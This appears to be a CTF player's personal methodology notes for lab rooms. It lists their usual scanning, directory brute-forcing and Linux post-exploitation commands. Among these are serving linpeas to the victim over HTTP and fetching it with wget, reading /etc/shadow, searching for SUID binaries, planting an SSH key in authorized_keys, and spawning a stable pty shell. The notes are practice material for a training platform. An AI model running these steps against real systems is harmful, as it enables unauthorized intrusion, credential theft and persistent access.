- Difficulties are categoried as the original author written
- Some easy are not that easy and not easy may be easy
- Though I titled as `writeups`, they are not written as writeups. 
- Just records to track the progress

- In notes, I often skip how to nmap scan, how directory brute forcing, how to get linpeas file, etc
- For that, I always use the same methods.

- First, I use zsh in my ubuntu machine and terminator (which can easily split screens, `Ctrl+Shift+o` for horizontal split and `Ctrl+Shift+e` for vertical split)
- After starting the rooms, I first export IP of the room `export IP=10.10.230.23` in `~/.zshrc` files

1. Nmap Scan

```sh
nmap -sC -sV $IP -oN nmap_init.log -vv
```

- if there are few ports found with default port scanning, I use rustcan to scan all ports (rustscan is fast)

```sh
rustscan -a $IP
```

2. Directory Brute Forcing with FFUF

- I first started with common.txt wordlist (I think it is inside Seclist but I move under usr folder)

```sh
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/common.txt -e php,txt -c -t 128
```

- If nothing found, use `directory-list-2.3-medium.txt` file

3. For sharing file from local machine to victim (room's) machine, I have already created folder `share/exploit`

- Inside that folder, I collect linpeas.sh, pspy, etc
- from local machine, create python server

```sh
python -m http.server 8888
```

- Then from room's shell,

```sh
wget http://$TUN0_IP:8888/linpeas.sh
```

4. For linux privilege escalation, I first check

```sh
sudo -l
id                # check groups, docker, sudo, lxd, etc
ls -la /home      # check the users with home directories
cat /etc/passwd   # check the users
cat /etc/shadow   # can i read this
cat /etc/crontab  # if there any cron jobs
sudo --version    # to check sudo bypass
find / -perm -4000 2>/dev/null # for suid bits
```

- if not found, run `linpeas.sh` file

5. If I already get user access and the machine has ssh service open and want to get ssh shell, I have already create `id_rsa` pair in my local machine with

```sh
ssh-keygen
# then fill -> id_rsa
# enter, enter -> for no password
```
- It will create `id_rsa` and `id_rsa.pub` file
- To enter into machine which you already get shell access, in victim machine, 

```sh
cd ~ # go to home directory
mkdir .ssh # create .ssh file
echo "contents_from_id_rsa.pub_from_local_machine" > .ssh/authorized_keys
# save your id_rsa.pub content as authorized keys
```
- from local machine

```sh
ssh username@$IP -i id_rsa
```
- it will enter with ssh

6. To get stable shell and if the machine is installed python3

- in victim machine

```sh
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
# press Ctrl+z -> to run as backgroud and will return to local machine shell
stty raw -echo; fg # will return to victim machine
reset
```
